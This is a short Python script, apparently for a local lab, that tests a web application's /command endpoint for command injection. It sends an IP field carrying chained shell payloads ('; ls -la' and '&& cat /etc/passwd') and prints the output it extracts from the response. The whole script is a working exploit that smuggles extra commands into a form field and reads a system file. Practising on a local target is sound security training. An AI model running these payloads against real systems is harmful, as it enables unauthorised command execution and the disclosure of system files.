import requests

url = "http://localhost:5000/command"
print("[+] Command Injection Tester")

# Basic test using semicolon to chain commands
payload = "8.8.8.8; ls -la"
print(f"Testing payload: {payload}")
r = requests.post(url, data={"ip": payload})

# Extract the output from the response
import re
output = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
if output:
    print("\nCommand Output:")
    print(output.group(1))
else:
    print("Couldn't extract output from response")

# Try another payload with command substitution
payload = "8.8.8.8 && cat /etc/passwd"
print(f"\nTesting payload: {payload}")
r = requests.post(url, data={"ip": payload})
output = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
if output:
    print("\nCommand Output:")
    print(output.group(1))
